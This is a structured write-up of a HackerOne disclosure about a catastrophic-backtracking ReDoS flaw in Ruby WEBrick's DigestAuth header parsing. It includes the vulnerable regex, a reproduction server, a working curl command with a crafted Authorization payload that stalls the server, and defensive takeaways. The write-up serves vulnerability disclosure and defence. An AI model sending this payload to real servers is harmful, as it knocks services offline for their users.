# WEBrick::HTTPAuth::DigestAuth ReDoS via Catastrophic Backtracking in split_param_value

## Metadata
- **Source:** HackerOne
- **Report:** 661722 | https://hackerone.com/reports/661722
- **Submitted:** 2019-07-27
- **Reporter:** 358
- **Program:** Ruby (via HackerOne)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Regular Expression Denial of Service (ReDoS), Catastrophic Backtracking, Denial of Service
- **CVEs:** None
- **Category:** memory-binary

## Summary
The WEBrick::HTTPAuth::DigestAuth class contains a vulnerable regular expression in the split_param_value method that suffers from catastrophic backtracking. An attacker can craft a malicious Authorization header with specially crafted input to cause 100% CPU consumption and effective denial of service.

## Attack scenario
1. Attacker identifies a web application using WEBrick with DigestAuth enabled
2. Attacker crafts an HTTP request with a malicious Authorization header containing the payload: 'Digest a="\b\b\b\b...\b"' (repeated backslash-b sequences)
3. The vulnerable regex '^\s*([\w\-\.\*\%\!]+)=\s*"((\\.|[^"])*?)"\s*,?' is invoked in split_param_value to parse the header
4. The regex engine enters catastrophic backtracking due to overlapping quantifiers and alternation in the pattern '(\\.|[^"])*'
5. Server thread consumes 100% CPU for extended period (9+ seconds for modest payload) while attempting to match
6. With multiple requests or larger payloads, server becomes unresponsive, resulting in denial of service

## Root cause
The regular expression uses nested quantifiers and alternation '(\\.|[^"])*' without atomic grouping or possessive quantifiers. When the closing quote is absent or malformed, the regex engine backtracks excessively through the escaped character alternatives, causing exponential time complexity relative to input length.

## Attacker mindset
An attacker would recognize that any publicly facing WEBrick server with DigestAuth is vulnerable to trivial DoS. They could send rapid requests with incrementally longer payloads to completely exhaust server resources, requiring minimal bandwidth or sophistication. This is a low-effort, high-impact attack requiring only knowledge of HTTP headers.

## Defensive takeaways
- Avoid complex regex patterns with nested quantifiers; use atomic grouping or possessive quantifiers to prevent backtracking
- Implement request timeouts on regex matching operations to abort pathological cases
- Use non-backtracking regex engines (e.g., .NET Regex with RegexOptions.NonBacktracking) where available
- Validate input length before passing to regex; set strict length limits on Authorization headers
- Consider using dedicated parsing libraries instead of hand-crafted regex for protocol parsing
- Implement rate limiting and request throttling to mitigate DoS impact
- Monitor CPU usage patterns to detect ReDoS attacks in production

## Variant hunting
Search for similar patterns in other authentication modules (BasicAuth, similar digest implementations). Look for other uses of (\\.|[^"])*  or similar nested quantifier patterns in Ruby stdlib and gems. Check for similar issues in HTTP header parsing, JSON parsing, or any user-controlled input validated with complex regex. Examine other WEBrick authentication schemes and related libraries.

## MITRE ATT&CK
- T1190
- T1499.4

## Notes
This vulnerability affects Ruby's standard library, making it a widespread issue. The fix involves refactoring the regex to use atomic grouping or possessive quantifiers, or replacing the regex entirely with safer parsing logic. The vulnerability is unauthenticated in that no valid credentials are required—the malicious input is processed during authentication attempt itself.

## Full report
<details><summary>Expand</summary>

The private instance method `split_param_value` in class `WEBrick::HTTPAuth::DigestAuth` uses a regular expression that is vulnerable to denial of service due to catastrophic backtracking.

The regular expression is: ^\s*([\w\-\.\*\%\!]+)=\s*\"((\\.|[^\"])*)\"\s*,?
Source: https://github.com/ruby/ruby/blob/149e414ed529d27aaeb0543bc133e08c782d8d41/lib/webrick/httpauth/digestauth.rb#L295

Sample attack string that causes catastrophic backtracking: a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b

The issue can be reproduced with the following HTTP server configured with DigestAuth:

```
#!/usr/bin/env ruby

require 'webrick'

config = { :Realm => 'DigestAuth example realm' }

htdigest = WEBrick::HTTPAuth::Htdigest.new 'my_password_file'
htdigest.set_passwd config[:Realm], 'username', 'password'
htdigest.flush

config[:UserDB] = htdigest

digest_auth = WEBrick::HTTPAuth::DigestAuth.new config

auth_handler = proc do |request, response|
  digest_auth.authenticate request, response
end

server = WEBrick::HTTPServer.new :Port => 8000, :RequestCallback => auth_handler

server.mount_proc '/' do |req, res|
  res.body = 'hello, world'
end

trap 'INT' do server.shutdown end
server.start
```

Running the program above, an attacker can cause the HTTP server to consume 100% CPU by sending an authorization header that exploits the catastrophic backtracking.

Sample HTTP request with cURL:
```sh
$ time curl -I --header 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b' http://localhost:8000
HTTP/1.1 400 Bad Request 
Content-Type: text/html; charset=ISO-8859-1
Server: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
Date: Sat, 27 Jul 2019 05:38:27 GMT
Content-Length: 291
Connection: close


real	0m9.714s
user	0m0.013s
sys	0m0.003s
```

Note that it takes the HTTP server 9 seconds to respond that it's a bad request. A larger attack string, like 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b', would take much longer to evaluate.

## Impact

An attacker could cause an effective denial of service, by crafting an input which exploits catastrophic backtracking for the regular expression.

</details>

---
*Analysed by Claude on 2026-05-24*
